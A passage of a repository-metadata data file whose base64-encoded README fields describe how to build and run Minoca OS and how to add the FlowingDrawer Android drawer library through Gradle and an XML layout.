Z2VzLiBUaGUgcmVzdCBvZiB0aGlzIHBhZ2UgZGVzY3JpYmVzIGhvdyB0byB1
c2UgdGhpcyByZXBvc2l0b3J5IHRvIGJ1aWxkIHlvdXIgb3duIGN1c3RvbSBp
bWFnZSBvZiBNaW5vY2EgT1MuCgojIyBCdWlsZGluZyBNaW5vY2EgT1MKVGhl
IHBhcmFncmFwaHMgYmVsb3cgd2lsbCBnZXQgeW91IGZyb20gYSBmcmVzaCBj
bG9uZSB0byBhIGJ1aWx0IGltYWdlLgoKIyMjIEVudmlyb25tZW50ClRoZSBN
aW5vY2EgT1MgYnVpbGQgZW52aXJvbm1lbnQgaXMga2V5ZWQgb2ZmIG9mIGEg
ZmV3IGVudmlyb25tZW50IHZhcmlhYmxlcyB5b3UnbGwgbmVlZCB0byBzZXQg
aW4gb3JkZXIgdG8gb3JpZW50IHRoZSBidWlsZCBzeXN0ZW06CiAtIGBTUkNS
T09UYCAtIENvbnRhaW5zIHRoZSBhYnNvbHV0ZSBwYXRoIHRvIHRoZSBiYXNl
IHNvdXJjZSBkaXJlY3RvcnkuIFRoaXMgcmVzcG9zaXRvcnkgaXMgZXhwZWN0
ZWQgdG8gYmUgaW4gYSBkaXJlY3RvcnkgY2FsbGVkIGBvc2AgaW5zaWRlIGBT
UkNST09UYC4gSWYgdGhlIHRoaXJkLXBhcnR5IG9yIHRvb2xzIHJlcG9zaXRv
cmllcyBhcmUgcHJlc2VudCwgdGhleSBzaG91bGQgYmUgaW4gZGlyZWN0b3Jp
ZXMgY2FsbGVkIGB0aGlyZC1wYXJ0eWAgYW5kIGB0b29sc2AgcmVzcGVjdGl2
ZWx5IHVuZGVybmVhdGggYFNSQ1JPT1RgLiBGb3IgZXhhbXBsZSwgaWYgeW91
IGhhZCBjaGVja2VkIG91dCB0aGlzIHJlcG9zaXRvcnkgaW50byBgfi9zcmMv
b3NgLCB0aGVuIGluIHlvdXIgc2hlbGwgeW91J2QgcnVuIGBleHBvcnQgU1JD
Uk9PVD1+L3NyY2AuCiAtIGBBUkNIYCAtIENvbnRhaW5zIHRoZSBhcmNoaXRl
Y3R1cmUgdG8gYnVpbGQgTWlub2NhIE9TIGZvciAoYWthIHRoZSB0YXJnZXQg
YXJjaGl0ZWN0dXJlKS4gVmFsaWQgdmFsdWVzIGFyZSBgYXJtdjZgLCBgYXJt
djdgLCBhbmQgYHg4NmAuCiAtIGBWQVJJQU5UYCAtIENvbnRhaW5zIHRoZSBh
cmNoaXRlY3R1cmUgdmFyaWFudCwgaWYgYW55LiBMZWF2ZSB0aGlzIHVuc2V0
IG1vc3Qgb2YgdGhlIHRpbWUuIEN1cnJlbnRseSB0aGUgb25seSB2YWxpZCB2
YWx1ZSBpcyBgcWAgZm9yIHRoZSBgeDg2YCBhcmNoaXRlY3R1cmUsIHdoaWNo
IGJ1aWxkcyBmb3IgdGhlIEludGVsIFF1YXJrLgogLSBgREVCVUdgIC0gRGVz
Y3JpYmVzIHdoZXRoZXIgdG8gYnVpbGQgTWlub2NhIE9TIGZvciBkZWJ1Z2dp
bmcgb3IgcmVsZWFzZS4gVmFsaWQgdmFsdWVzIGFyZSBgZGJnYCBmb3IgZGVi
dWcgb3IgYHJlbGAgZm9yIHJlbGVhc2UuIFdlIGFsd2F5cyBidWlsZCBgZGJn
YC4KIC0gYFBBVEhgIC0gWW91J2xsIG5lZWQgdG8gaGF2ZSBgJFNSQ1JPT1Qv
JEFSQ0gkVkFSSUFOVCRERUJVRy90b29scy9iaW5gIGluIHlvdXIgcGF0aCB0
byBidWlsZCBzdWNjZXNzZnVsbHkuCgojIyMgUHJlcmVxdWlzaXRlcwpUbyBi
dWlsZCBNaW5vY2EgT1MgeW91J2xsIG5lZWQgYSBNaW5vY2Etc3BlY2lmaWMg
dG9vbGNoYWluIGZvciB0aGUgcGFydGljdWxhciBhcmNoaXRlY3R1cmUgeW91
J3JlIGJ1aWxkaW5nLiBQcmVidWlsdCB0b29sY2hhaW5zIGNhbiBiZSBmb3Vu
ZCBbaGVyZV0oaHR0cHM6Ly93d3cubWlub2NhY29ycC5jb20vZG93bmxvYWQv
I3Rvb2xjaGFpbikuIElmIHlvdSB3YW50IHRvIGJ1aWxkIHRoZSB0b29sY2hh
aW4gZnJvbSBzb3VyY2VzLCB5b3UnbGwgbmVlZCB0byBjaGVjayBvdXQgdGhl
IFt0aGlyZC1wYXJ0eV0oaHR0cHM6Ly9naXRsYWIuY29tL21pbm9jYS90aGly
ZC1wYXJ0eSkgcmVwb3NpdG9yeSBhbmQgcnVuICJtYWtlIHRvb2xzIiBpbiB0
aGVyZS4KPiBOb3RlOiBJZiB5b3Ugd2FudCB0byBidWlsZCB5b3VyIG93biB0
b29sY2hhaW4gb24gV2luZG93cywgeW91IG1heSBmaW5kIHRoZSBbdG9vbHNd
KGh0dHBzOi8vZ2l0bGFiLmNvbS9taW5vY2EvdG9vbHMpIHJlcG9zaXRvcnkg
aGVscGZ1bCwgYXMgaXQgY29udGFpbnMgYSBuYXRpdmUgTWluR1cgY29tcGls
ZXIsIG1ha2UsIGFuZCBvdGhlciB0b29scyBuZWVkZWQgdG8gYm9vdHN0cmFw
IGEgdG9vbGNoYWluIG9uIFdpbmRvd3MuCgojIyMgQnVpbGQKUnVuIGBtYWtl
YCB0byBidWlsZCB0aGUgT1MgZm9yIHRoZSBwYXJ0aWN1bGFyIGFyY2hpdGVj
dHVyZSB5b3UndmUgc3VwcGxpZWQuIFBhcmFsbGVsIG1ha2UgaXMgc3VwcG9y
dGVkLiBUaGUgZmluYWwgb3V0cHV0IG9mIHRoZSBidWlsZCB3aWxsIGJlIHNl
dmVyYWwgLmltZyBmaWxlcyBsb2NhdGVkIGluIGAkU1JDUk9PVC8kQVJDSCRW
QVJJQU5UJERFQlVHL2Jpbi8qLmltZ2AuIEZvciBleGFtcGxlLCB0aGUgUEMg
aW1hZ2UgaXMgdXN1YWxseSBsb2NhdGVkIGF0IGAkU1JDUk9PVC94ODZkYmcv
YmluL3BjLmltZ2AuIFRoaXMgaXMgYSByYXcgaGFyZCBkaXNrIGZpbGUgdGhh
dCBjYW4gYmUgYXBwbGllZCBkaXJlY3RseSB0byBhIGhhcmQgZHJpdmUgb3Ig
VVNCIHN0aWNrIHRvIGJvb3QgTWlub2NhIE9TLiBUaGUgaW1hZ2UgYGluc3Rh
bGwuaW1nYCBpcyBhIGdlbmVyaWMgaW5zdGFsbGF0aW9uIGFyY2hpdmUgdGhh
dCB0aGUgYG1zZXR1cGAgdG9vbCBjYW4gdXNlIHRvIGNyZWF0ZSBuZXcgTWlu
b2NhIE9TIGluc3RhbGxhdGlvbnMgb24gdGFyZ2V0IGRpc2tzIG9yIHBhcnRp
dGlvbnMuCgpPYmplY3QgZmlsZXMgYXJlIGdlbmVyYXRlZCBpbiBgJFNSQ1JP
T1QvJEFSQ0gkVkFSSUFOVCRERUJVRy9vYmovb3NgLiBZb3UgY2FuIHJ1biBg
bWFrZSBjbGVhbmAsIG9yIHNpbXBseSBkZWxldGUgdGhpcyBkaXJlY3Rvcnks
IHRvIGNhdXNlIHRoZSBvcyByZXBvc2l0b3J5IHRvIGNvbXBsZXRlbHkgcmVi
dWlsZC4gQWx0ZXJuYXRpdmVseSwgeW91IGNhbiBydW4gYG1ha2Ugd2lwZWAg
dG8gZGVsZXRlIGFsbCBnZW5lcmF0ZWQgZmlsZXMsIGluY2x1ZGluZyB0aGUg
dGhpcmQtcGFydHkgdG9vbHMgeW91IGJ1aWx0IG9yIGRvd25sb2FkZWQuIFJ1
bm5pbmcgYG1ha2Ugd2lwZWAgc2ltcGx5IGRlbGV0ZXMgYCRTUkNST09ULyRB
UkNIJFZBUklBTlQkREVCVUcvYC4gV2UgdXN1YWxseSBzdGljayB0byBgbWFr
ZSBjbGVhbmAgc2luY2UgYG1ha2Ugd2lwZWAgcmVxdWlyZXMgYSBjb21wbGV0
ZSByZWJ1aWxkIG9mIHRoZSB0b29sY2hhaW4uCgpBIG5vdGUgZm9yIG1hY09T
IHVzZXJzOiBXZSd2ZSBtYW5hZ2VkIHRvIGJ1aWxkIHN1Y2Nlc3NmdWxseSB1
c2luZyBib3RoIEdDQyBmcm9tIFhDb2RlIDggKHJlYWxseSBjbGFuZykgYW5k
IEhvbWVicmV3IEdDQywgYm90aCB1c2luZyB0aGUgMTAuMTIgU0RLLiBTb21l
IHVzZXJzIGhhdmUgcmVwb3J0ZWQgdGhhdCB0aGV5IG5lZWQgdG8gZXhwb3J0
IGBTREtST09UPSQoeGNydW4gLS1zaG93LXNkay1wYXRoKWAgdG8gYnVpbGQg
cHJvcGVybHkuCgojIyMgUnVubmluZwpUbyBib290IHlvdXIgYnVpbHQgaW1h
Z2VzLCB5b3UgY2FuIHdyaXRlIHRoZSBhcHByb3ByaWF0ZSBpbWFnZSBmb3Ig
dGhlIHBsYXRmb3JtIHlvdSdyZSB0cnlpbmcgdG8gYm9vdCB0byBhIFVTQiBm
bGFzaCBkcml2ZSBvciBoYXJkIGRpc2suIE9uIFdpbmRvd3MsIHlvdSBjYW4g
dXNlIHRoZSBXaW4zMkRpc2tJbWFnZXIgdG9vbCAoaW5jbHVkZWQgaW4gdGhl
IFt0b29sc10oaHR0cHM6Ly9naXRsYWIuY29tL21pbm9jYS90b29scykgcmVw
b3NpdG9yeSB1bmRlciB3aW4zMi9XaW4zMkRpc2tJbWFnZXIpLiBZb3UgY2Fu
IGFsc28gdXNlIHRoZSBtc2V0dXAgdG9vbCB0byBidWlsZCBjdXN0b20gaW1h
Z2VzLiBJZiB5b3UgdXNlIHRoZSBtc2V0dXAgdG9vbCB0byBpbnN0YWxsIE1p
bm9jYSBPUyBvbnRvIGEgcGFydGl0aW9uIG9mIGEgZGlzayBjb250YWluaW5n
IG90aGVyIHBhcnRpdGlvbnMgdGhhdCB5b3UgY2FyZSBhYm91dCAoc3VjaCBh
cyBvbiB0aGUgc2FtZSBtYWNoaW5lIHlvdSdyZSBidWlsZGluZyBmcm9tKSwg
d2UgaGlnaGx5IHJlY29tbWVuZCBtYWtpbmcgYSBjb21wbGV0ZSBiYWNrdXAg
b2YgeW91ciBkaXNrLiBNaW5vY2EgT1MgaXMgc3RpbGwgbmV3LCBhbmQgd2Ug
d291bGRuJ3Qgd2FudCBhIGJhZCBidWcgdG8gd2lwZSBvdXQgYWxsIHlvdXIg
ZGF0YS4KCklmIHlvdSdyZSBidWlsZGluZyBNaW5vY2EgT1Mgb24gV2luZG93
cyBhbmQgaGF2ZSBkb3dubG9hZGVkIHRoZSBbdG9vbHNdKGh0dHBzOi8vZ2l0
bGFiLmNvbS9taW5vY2EvdG9vbHMpIHJlcG9zaXRvcnksIHNldmVyYWwgc2hv
cnRjdXRzIGhhdmUgYmVlbiBzZXQgdXAgdG8gYWxsb3cgeW91IHRvIHF1aWNr
bHkgcnVuIGEgUWVtdSBpbnN0YW5jZSB3aXRoIHRoZSBpbWFnZXMgeW91J3Zl
IGp1c3QgYnVpbHQuIE1ha2Ugc3VyZSB5b3UgZmlyZWQgdXAgdGhlIGRldmVs
b3BtZW50IGVudmlyb25tZW50IHdpdGggdGhlIHNldGVudi5jbWQgc2NyaXB0
LiBUeXBlIGBydW5gLCB0aGVuIGBkeGAgdG8gZmlyZSB1cCBhbiB4ODYgUWVt
dSBpbnN0YW5jZSBvZiBwYy5pbWcgd2l0aCBhIGtlcm5lbCBkZWJ1Z2dlciBh
dHRhY2hlZC4gV2UgdXNlIHRoaXMgaW50ZXJuYWxseSBmb3IgZmFzdGVyIGRl
dmVsb3BtZW50LiBJZiBidWlsZGluZyBmb3IgQVJNLCBpdCdzIGBydW5hcm1g
IGFuZCBgZGFgLgoKIyMjIE5pY2tlbCBUb3VyCkJlbG93IGlzIGEgYnJpZWYg
b3JpZW50YXRpb24gb2YgYSBmZXcgb2YgdGhlIGRpcmVjdG9yaWVzIGluIHRo
ZSByZXBvc2l0b3J5LiBDaGVjayB0aGUgTWFrZWZpbGUgaW4gZWFjaCBkaXJl
Y3RvcnkgZm9yIGEgbW9yZSBkZXRhaWxlZCBkZXNjcmlwdGlvbiBvZiB3aGF0
IHRoYXQgZGlyZWN0b3J5IGNvbnRhaW5zLgogKiBgYXBwc2AgLSBVc2VyIG1v
ZGUgYXBwbGljYXRpb25zIGFuZCBsaWJyYXJpZXMKICAgKiBgY2tgIC0gQ2hh
bGssIGFuIGVtYmVkZGFibGUgc2NyaXB0aW5nIGxhbmd1YWdlCiAgICogYGRl
YnVnYCAtIERlYnVnZ2VyIGFwcGxpY2F0aW9uCiAgICogYGxpYmNgIC0gVGhl
IE1pbm9jYSBPUyBDIExpYnJhcnkKICAgKiBgb3NiYXNlYCAtIFRoZSBNaW5v
Y2Ega2VybmVsIEFQSSBsaWJyYXJ5CiAgICogYHNldHVwYCAtIFRoZSBtc2V0
dXAgYnVpbGQgdG9vbAogICAqIGBzd2lzc2AgLSBQT1NJWCB0b29scyBpbiBh
IGJveAogKiBgYm9vdGAgLSBFeGVjdXRhYmxlcyB1c2VkIGR1cmluZyBzeXN0
ZW0gYm9vdAogICAqIGBtYnJgIC0gVGhlIE1hc3RlciBCb290IFJlY29yZAog
ICAqIGBmYXRib290YCAtIFRoZSBWb2x1bWUgQm9vdCBSZWNvcmQgZm9yIEZB
VCBmaWxlIHN5c3RlbXMKICAgKiBgYm9vdG1hbmAgLSBUaGUgTWlub2NhIEJv
b3QgTWFuYWdlcgogICAqIGBsb2FkZXJgIC0gVGhlIE1pbm9jYSBPUyBsb2Fk
ZXIKICAgKiBgbGliYCAtIExpYnJhcmllcyBzaGFyZWQgYWNyb3NzIG11bHRp
cGxlIGJvb3QgZXhlY3V0YWJsZXMKICogYGRyaXZlcnNgIC0gRGV2aWNlIGRy
aXZlcnMKICAgKiBgYWNwaWAgLSBBQ1BJIHBsYXRmb3JtIGRyaXZlciwgd2l0
aCBBTUwgaW50ZXJwcmV0ZXIKICAgKiBgZmF0YCAtIEZBVCBmaWxlIHN5c3Rl
bSBkcml2ZXIKICAgKiBgZ3Bpb2AgLSBHUElPIGNvcmUgbGlicmFyeSBhbmQg
U29DIGRyaXZlcnMKICAgKiBgbmV0YCAtIE5ldHdvcmtpbmcgc3VwcG9ydAog
ICAgICogYGV0aGVybmV0YCAtIFdpcmVkIGV0aGVybmV0IGNvbnRyb2xsZXIg
ZHJpdmVycwogICAgICogYG5ldDgwMjExYCAtIENvcmUgODAyLjExIHN1cHBv
cnQKICAgICAqIGBuZXRjb3JlYCAtIENvcmUgbmV0d29ya2luZyBzdXBwb3J0
IChUQ1AsIFVEUCwgSVAsIEFSUCwgZXRjKQogICAgICogYHdpcmVsZXNzYCAt
IDgwMi4xMSB3aXJlbGVzcyBjb250cm9sbGVyIGRyaXZlcnMKICAgKiBgcGNp
YCAtIFBDSSBzdXBwb3J0CiAgICogYHNkYCAtIFNEL01NQyBzdXBwb3J0CiAg
ICogYHNwYmAgLSBTZXJpYWwgUGVyaXBoZXJhbCBCdXMgZHJpdmVycyAoSTJD
LCBTUEkpCiAgICogYHNwZWNpYWxgIC0gU3BlY2lhbCBkZXZpY2VzICgvZGV2
L251bGwsIGZ1bGwsIHplcm8pCiAgICogYHVzYmAgLSBVU0Igc3VwcG9ydAog
ICAgICogYGVoY2lgIC0gRUhDSSBob3N0IGNvbnRyb2xsZXIgc3VwcG9ydAog
ICAgICogYHVzYmNvbXBgIC0gVVNCIGNvbXBvc2l0ZSBkZXZpY2Ugc3VwcG9y
dAogICAgICogYHVzYmhpZGAgLSBVU0IgSElEIHN1cHBvcnQKICAgICAqIGB1
c2JodWJgIC0gVVNCIGh1YiBzdXBwb3J0CiAgICAgKiBgdXNia2JkYCAtIFVT
QiBrZXlib2FyZCBzdXBwb3J0CiAgICAgKiBgdXNibWFzc2AgLSBVU0IgbWFz
cyBzdG9yYWdlIHN1cHBvcnQKICAgICAqIGB1c2Jtb3VzZWAgLSBVU0IgbW91
c2Ugc3VwcG9ydAogICAqIGBpbnB1dGAgLSBVc2VyIGlucHV0IGRyaXZlcnMK
ICAgKiBgdmlkZW9jb25gIC0gVmlkZW8gdGVybWluYWwgY29uc29sZSBkcml2
ZXIKICogYGltYWdlc2AgLSBSZWNpcGVzIHRvIGNyZWF0ZSB0aGUgZmluYWwg
aW1hZ2VzIGZvciBlYWNoIHN1cHBvcnRlZCBwbGF0Zm9ybQogKiBgaW5jbHVk
ZWAgLSBQdWJsaWMgaGVhZGVyIGZpbGVzCiAqIGBrZXJuZWxgIC0gVGhlIE1p
bm9jYSBPUyBrZXJuZWwKICAgKiBga2VgIC0gSGlnaCBsZXZlbCBleGVjdXRp
dmUgZnVuY3Rpb25zCiAgICogYG1tYCAtIE1lbW9yeSBtYW5hZ2VtZW50CiAg
ICogYGlvYCAtIElucHV0L091dHB1dCBzdWJzeXN0ZW0KICAgKiBga2RgIC0g
S2VybmVsIGRlYnVnIHN1cHBvcnQKICAgKiBgaGxgIC0gTG93IGxldmVsIGhh
cmR3YXJlIGxheWVyIHN1cHBvcnQKICAgKiBgb2JgIC0gT2JqZWN0IG1hbmFn
ZW1lbnQKICAgKiBgcHNgIC0gUHJvY2VzcyBhbmQgdGhyZWFkIG1hbmFnZW1l
bnQKICAgKiBgc3BgIC0gU3lzdGVtIHByb2ZpbGVyIHN1cHBvcnQKICogYGxp
YmAgLSBDb21tb24gbGlicmFyaWVzIHVzZWQgdGhyb3VnaG91dCBib290LCBr
ZXJuZWwsIGFuZCB1c2VyIG1vZGUuCiAgICogYGJhc2V2aWRgIC0gTGlicmFy
eSBmb3IgZHJhd2luZyB0ZXh0IG9uIGEgZnJhbWVidWZmZXIKICAgKiBgZmF0
bGliYCAtIEZBVCBmaWxlIHN5c3RlbSBsaWJyYXJ5CiAgICogYGltYCAtIEVM
Ri9QRSBpbWFnZSBsaWJyYXJ5CiAgICogYHBhcnRsaWJgIC0gUGFydGl0aW9u
IGxpYnJhcnkKICAgKiBgcnRsYCAtIEdlbmVyYWwgcnVudGltZSBsaWJyYXJ5
IChwcmludGYsIGRhdGUvdGltZSwgbWVtY3B5LCBldGMpCiAgICogYHRlcm1s
aWJgIC0gVGVybWluYWwgc3VwcG9ydCBsaWJyYXJ5CiAqIGB0YXNrc2AgLSBJ
bnRlcm5hbCBhdXRvbWF0aW9uIGNvbmZpZ3VyYXRpb24KICogYHVlZmlgIC0g
TWluaW1hbCBVRUZJIGltcGxlbWVudGF0aW9uIGZvciBwbGF0Zm9ybXMgc3Vw
cG9ydGVkIGJ5IE1pbm9jYSBPUy4KICAgKiBgY29yZWAgLSBQbGF0Zm9ybS1h
Z25vc3RpYyBVRUZJIGZpcm13YXJlIGNvcmUKICAgKiBgZGV2YCAtIFVFRkkg
ZGV2aWNlIGxpYnJhcmllcwogICAqIGBwbGF0YCAtIFJlY2lwZXMgYW5kIGNv
ZGUgZm9yIHNwZWNpZmljIHBsYXRmb3JtcwogICAgICogYGJlYWdib25lYCAt
IEJlYWdsZUJvbmUgQmxhY2sgZmlybXdhcmUKICAgICAqIGBiaW9zYCAtIFVF
Rkkgb3ZlciBCSU9TIGZpcm13YXJlCiAgICAgKiBgaW50ZWdjcGAgLSBJbnRl
Z3JhdG9yL0NQIGZpcm13YXJlIChmb3IgQVJNIFFlbXUpCiAgICAgKiBgcGFu
ZGFgIC0gVEkgUGFuZGFCb2FyZCBmaXJtd2FyZQogICAgICogYHJwaWAgLSBS
YXNwYmVycnkgUGkgMSBmaXJtd2FyZQogICAgICogYHJwaTJgIC0gUmFzcGJl
cnJ5IFBpIDIgYW5kIDMgZmlybXdhcmUKICAgICAqIGB2ZXlyb25gIC0gQXN1
cyBDMjAxIENocm9tZWJvb2sgZmlybXdhcmUKICAgKiBgdG9vbHNgIC0gVG9v
bHMgdXNlZCBpbiBidWlsZGluZyBmaW5hbCBmaXJtd2FyZSBpbWFnZXMKCiMj
IENvbnRyaWJ1dGluZwpTdWJtaXNzaW9ucyBhcmUgd2VsY29tZSEgU2VlIG91
ciBbQ09OVFJJQlVUSU5HLm1kXShDT05UUklCVVRJTkcubWQpIHBhZ2UgZm9y
IGRldGFpbHMsIG9yIG91ciBbV0lTSExJU1RdKGRvY3MvV0lTSExJU1QubWQp
IHBhZ2UgZm9yIHN1Z2dlc3Rpb25zLiBCdWdzIGNhbiBiZSByZXBvcnRlZCBo
ZXJlIG9uIEdpdGh1Yi4KCiMjIExpY2Vuc2UKTWlub2NhIE9TIGlzIGxpY2Vu
c2VkIHRvIHRoZSBwdWJsaWMgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUg
R2VuZXJhbCBQdWJsaWMgTGljZW5zZSwgdmVyc2lvbiAzLiBBbHRlcm5hdGUg
bGljZW5zaW5nIG9wdGlvbnMgYXJlIGF2YWlsYWJsZS4gQ29udGFjdCBpbmZv
QG1pbm9jYWNvcnAuY29tIGlmIHlvdXIgY29tcGFueSBpcyBpbnRlcmVzdGVk
IGluIGxpY2Vuc2luZyBNaW5vY2EgT1MuIEZvciBjb21wbGV0ZSBsaWNlbnNp
bmcgaW5mb3JtYXRpb24sIHNlZSB0aGUgW0xJQ0VOU0VdKExJQ0VOU0UpIGZp
bGUgaW4gdGhpcyByZXBvc2l0b3J5LgoKIyMgQ29udGFjdAogKiBFbWFpbDog
bWlub2NhLWRldkBnb29nbGVncm91cHMuY29tCiAgICogQ29udGFjdCBzZWN1
cml0eUBtaW5vY2Fjb3JwLmNvbSBmb3Igc2VjdXJpdHkgcmVsYXRlZCBpc3N1
ZXMuCiAgICogQ29udGFjdCBpbmZvQG1pbm9jYWNvcnAuY29tIGZvciBwcml2
YXRlIG9yIGJ1c2luZXNzIGlucXVyaWVzLgogKiBXZWJzaXRlOiBbaHR0cDov
L3d3dy5taW5vY2Fjb3JwLmNvbS9dKGh0dHA6Ly93d3cubWlub2NhY29ycC5j
b20pCiAqIEdpdGh1YjogW2h0dHBzOi8vZ2l0aHViLmNvbS9taW5vY2FdKGh0
dHBzOi8vZ2l0aHViLmNvbS9taW5vY2EpCiAqIEdpdGxhYjogW2h0dHBzOi8v
Z2l0bGFiLmNvbS9taW5vY2FdKGh0dHBzOi8vZ2l0bGFiLmNvbS9taW5vY2Ep
CiAqIElSQzogW2lyY3M6Ly9pcmMub2Z0Yy5uZXQ6NjY5Ny9taW5vY2Etb3Nd
KGlyY3M6Ly9pcmMub2Z0Yy5uZXQ6NjY5Ny9taW5vY2Etb3MpCgo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'FlowingDrawer',40713924,b'swipe display drawer with flowing & bouncing effects.',b'Java',0,2385,,2385,False,b'https://api.github.com/repos/mxn21/FlowingDrawer/forks',"IyBGbG93aW5nRHJhd2VyIAoKWyFbQW5kcm9pZCBBcnNlbmFsXShodHRwczov
L2ltZy5zaGllbGRzLmlvL2JhZGdlL0FuZHJvaWQlMjBBcnNlbmFsLUZsb3dp
bmdEcmF3ZXItZ3JlZW4uc3ZnP3N0eWxlPWZsYXQpXShodHRwczovL2FuZHJv
aWQtYXJzZW5hbC5jb20vZGV0YWlscy8xLzI2NTgpClshW3RyYXZpcy1pY10o
aHR0cHM6Ly90cmF2aXMtY2kub3JnL214bjIxL0Zsb3dpbmdEcmF3ZXIuc3Zn
P2JyYW5jaD1tYXN0ZXIpXShodHRwczovL3RyYXZpcy1jaS5vcmcvbXhuMjEv
Rmxvd2luZ0RyYXdlcikKCiFbU2hvd2Nhc2VdKC9zY3JlZW4uZ2lmKQoKc3dp
cGUgcmlnaHQgdG8gZGlzcGxheSBkcmF3ZXIgd2l0aCBmbG93aW5nIGVmZmVj
dHMuCgoKIyMgRG93bmxvYWQKCkluY2x1ZGUgdGhlIGZvbGxvd2luZyBkZXBl
bmRlbmN5IGluIHlvdXIgYnVpbGQuZ3JhZGxlIGZpbGUuCgpHcmFkbGU6Cgpg
YGBHcmFkbGUKICAgIHJlcG9zaXRvcmllcyB7CiAgICAgICAgamNlbnRlcigp
CiAgICB9CgogICAgZGVwZW5kZW5jaWVzIHsKICAgICAgICBpbXBsZW1lbnRh
dGlvbiAnY29tLm14bi5zb3VsOmZsb3dpbmdkcmF3ZXItY29yZToyLjEuMCcK
ICAgICAgICBpbXBsZW1lbnRhdGlvbiAnY29tLm5pbmVvbGRhbmRyb2lkczps
aWJyYXJ5OjIuNC4wJwogICAgfQpgYGAKCiMjIFYyLjAuMCBGZWF0dXJlcwoK
ICogVGhlIG1lbnUgY2FuIGJlIHBvc2l0aW9uZWQgYWxvbmcgdHdvIGVkZ2Vz
OmxlZnQgYW5kIHJpZ2h0IC4KICogQWxsb3dzIHRoZSBkcmF3ZXIgdG8gYmUg
b3BlbmVkIGJ5IGRyYWdnaW5nIHRoZSBlZGdlIG9yIHRoZSBlbnRpcmUgc2Ny
ZWVuLgoKCiMjIFVzYWdlCgoqRm9yIGEgd29ya2luZyBpbXBsZW1lbnRhdGlv
biBvZiB0aGlzIHByb2plY3Qgc2VlIHRoZSBgYXBwL2AgZm9sZGVyIGFuZCBj
aGVjayBvdXQgdGhlIHNhbXBsZSBhcHAqCgphY3Rpdml0eV9tYWluLnhtbDoK
CmBgYHhtbAogICAgPGNvbS5teG4uc291bC5mbG93aW5nZHJhd2VyX2NvcmUu
Rmxvd2luZ0RyYXdlcgogICAgICAgICAgICB4bWxuczphcHA9Imh0dHA6Ly9z
Y2hlbWFzLmFuZHJvaWQuY29tL2Fway9yZXMtYXV0byIKICAgICAgICAgICAg
eG1sbnM6YW5kcm9pZD0iaHR0cDovL3NjaGVtYXMuYW5kcm9pZC5jb20vYXBr
L3Jlcy9hbmRyb2lkIgogICAgICAgICAgICBhbmRyb2lkOmlkPSJAK2lkL2Ry
YXdlcmxheW91dCIKICAgICAgICAgICAgYW5kcm9pZDpsYXlvdXRfd2lkdGg9
Im1hdGNoX3BhcmVudCIKICAgICAgICAgICAgYW5kcm9pZDpsYXlvdXRfaGVp
Z2h0PSJtYXRjaF9wYXJlbnQiCiAgICAgICAgICAgIGFuZHJvaWQ6Y2xpcENo
aWxkcmVuPSJmYWxzZSIKICAgICAgICAgICAgYW5kcm9pZDpjbGlwVG9QYWRk
aW5nPSJmYWxzZSIKICAgICAgICAgICAgYXBwOmVkUG9zaXRpb249IjEiCiAg
ICAgICAgICAgIGFwcDplZE1lbnVTaXplPSIyNjBkcCIKICAgICAgICAgICAg
YXBwOmVkTWVudUJhY2tncm91bmQ9IiNkZGRkZGQiPgoKICAgICAgICA8IS0t
Y29udGVudC0tPgogICAgICAgIDxSZWxhdGl2ZUxheW91dAogICAgICAgICAg
ICAgICAgYW5kcm9pZDppZD0iQCtpZC9jb250ZW50IgogICAgICAgICAgICAg
ICAgYW5kcm9pZDpsYXlvdXRfd2lkdGg9Im1hdGNoX3BhcmVudCIKICAgICAg
ICAgICAgICAgIGFuZHJvaWQ6bGF5b3V0X2hlaWdodD0ibWF0Y2hfcGFyZW50
Ii8+CgogICAgICAgIDwhLS1tZW51LS0+CiAgICAgICAgPGNvbS5teG4uc291
bC5mbG93aW5nZHJhd2VyX2NvcmUuRmxvd2luZ01lbnVMYXlvdXQKICAgICAg
ICAgICAgICAgIGFuZHJvaWQ6aWQ9IkAraWQvbWVudWxheW91dCIKICAgICAg
ICAgICAgICAgIGFuZHJvaWQ6bGF5b3V0X3dpZHRoPSJtYXRjaF9wYXJlbnQi
CiAgICAgICAgICAgICAgICBhbmRyb2lkOmxheW91dF9oZWlnaHQ9Im1hdGNo
X3BhcmVudCI+CgogICAgICAgICAgICA8RnJhbWVMYXlvdXQKICAgICAgICAg
ICAgICAgICAgICBhbmRyb2lkOmlkPSJAK2lkL2lkX2NvbnRhaW5lcl9tZW51
IgogICAgICAgICAgICAgICAgICAgIGFuZHJvaWQ6bGF5b3V0X3dpZHRoPSJt
YXRjaF9wYXJlbnQiCiAgICAgICAgICAgICAgICAgICAgYW5kcm9pZDpsYXlv
dXRfaGVpZ2h0PSJtYXRjaF9wYXJlbnQiLz4KCiAgICAgICAgPC9jb20ubXhu
LnNvdWwuZmxvd2luZ2RyYXdlcl9jb3JlLkZsb3dpbmdNZW51TGF5b3V0PgoK
ICAgIDwvY29tLm14bi5zb3VsLmZsb3dpbmdkcmF3ZXJfY29yZS5GbG93aW5n
RHJhd2VyPgpgYGAKClRvIHVzZSBhIEZsb3dpbmdEcmF3ZXIsIHBvc2l0aW9u
IEZsb3dpbmdEcmF3ZXIgYXMgdGhlIHJvb3QgLCBwb3NpdGlvbiB5b3VyIHBy
aW1hcnkgY29udGVudCB2aWV3IGFzIHRoZQpmaXJzdCBjaGlsZCB3aXRoIHdp
ZHRoIGFuZCBoZWlnaHQgb2YgbWF0Y2hfcGFyZW50IC4gQWRkIEZsb3dpbmdN
ZW51TGF5b3V0IGFzIGNoaWxkIHZpZXdzIGFmdGVyIHRoZSBtYWluCmNvbnRl
bnQgdmlldyAuIEZsb3dpbmdNZW51TGF5b3V0IGNvbW1vbmx5IHVzZSBtYXRj
aF9wYXJlbnQgZm9yIGhlaWdodCBhbmQgd2lkdGguCgpEb24ndCBzZXQgYW55
IGJhY2tncm91bmQgb24gRmxvd2luZ01lbnVMYXlvdXQgb3IgRmxvd2luZ01l
bnVMYXlvdXQncyBjaGlsZHJlbiwgaXQgbWVhbnMgdGhlaXIgYmFja2dyb3Vu
